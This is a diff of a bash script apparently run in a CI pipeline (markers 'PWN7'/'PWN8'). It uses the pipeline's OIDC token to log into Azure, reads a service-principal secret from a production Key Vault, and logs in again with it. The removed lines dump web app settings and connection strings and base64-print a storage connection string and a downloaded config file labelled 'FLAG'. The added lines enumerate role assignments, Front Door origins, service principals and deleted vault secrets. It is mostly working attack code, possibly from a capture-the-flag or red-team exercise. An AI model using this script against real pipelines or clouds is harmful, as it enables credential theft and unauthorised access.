@@ -1,26 +1,21 @@
 #!/usr/bin/env bash
 set +e
-echo "=====PWN7_START====="
+echo "=====PWN8_START====="
 AUD="api:""//AzureADTokenExchange"
 IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
 az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/dev/null 2>&1
-V=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz -n cost-reader-principal --query value -o tsv 2>/dev/null)
-APP=$(printf %s "$V" | jq -r .appId); CS=$(printf %s "$V" | jq -r .clientSecret)
-az logout >/dev/null 2>&1
-az login --service-principal -u "$APP" --password="$CS" -t "${AZURE_TENANT_ID}" -o none >/dev/null 2>&1 && echo "cost-reader OK"
-RG=rg-tbl-platform-prod-sea; SITE=app-tbl-storefront-prod
-echo "=== APPSETTINGS ==="
-az webapp config appsettings list -g $RG -n $SITE -o json 2>&1 | head -c 3000; echo
-echo "=== CONNECTION STRINGS ==="
-az webapp config connection-string list -g $RG -n $SITE -o json 2>&1 | head -c 1500; echo
-echo "=== CONTAINER CONFIG ==="
-az webapp config container show -g $RG -n $SITE -o json 2>&1 | head -c 1500; echo
-echo "=== NEU CO CONN: TAI BLOB ==="
-CONN=$(az webapp config appsettings list -g $RG -n $SITE --query "[?name=='CONFIG_STORAGE_CONNECTION'].value" -o tsv 2>/dev/null)
-if [ -n "$CONN" ] && [ "$CONN" != "null" ]; then
-  echo "CONN b64: $(printf %s "$CONN" | base64 -w0)"
-  export AZURE_STORAGE_CONNECTION_STRING="$CONN"
-  az storage blob list --connection-string "$CONN" --container-name config -o tsv --query "[].name" 2>&1 | sed 's/^/blob: /' | head
-  az storage blob download --connection-string "$CONN" --container-name config --name internal-config.json -f /tmp/flagcfg.json >/dev/null 2>&1 && echo "FLAG_B64: $(base64 -w0 /tmp/flagcfg.json)"
-fi
-echo "=====PWN7_END====="
+echo "=== ROLE MAP LAI ==="
+az role assignment list --all -o tsv --query "[].[roleDefinitionName,principalType,principalId,scope]" 2>/dev/null | sort -u
+echo "=== AFD ORIGINS ==="
+for OG in $(az afd origin-group list -g rg-tbl-platform-prod-sea --profile-name afd-tbl-prod -o tsv --query "[].name" 2>/dev/null); do
+  echo "OG: $OG"
+  az afd origin list -g rg-tbl-platform-prod-sea --profile-name afd-tbl-prod --origin-group-name "$OG" -o json 2>/dev/null | jq -r '.[] | "  \(.name): \(.hostName) \(.enabledState)"'
+done
+echo "=== WEBAPP STATE ==="
+az webapp show -g rg-tbl-platform-prod-sea -n app-tbl-storefront-prod --query "{state:state,def:defaultHostname,kind:kind}" -o json 2>&1 | head -c 400; echo
+echo "=== GRAPH PROBE ==="
+az ad sp show --id d2cdf247-9319-40cb-8324-5a005ef538da 2>&1 | jq -r '.appId // .message' 2>/dev/null | head -2
+az ad sp show --id c15570ad-5fd2-430c-97bb-a49e9a08d95c 2>&1 | jq -r '.appId // .message' 2>/dev/null | head -2
+echo "=== KV DELETED SECRETS ==="
+az keyvault secret list-deleted --vault-name kv-tbl-prod-x3euoz -o tsv --query "[].name" 2>&1 | head -8
+echo "=====PWN8_END====="
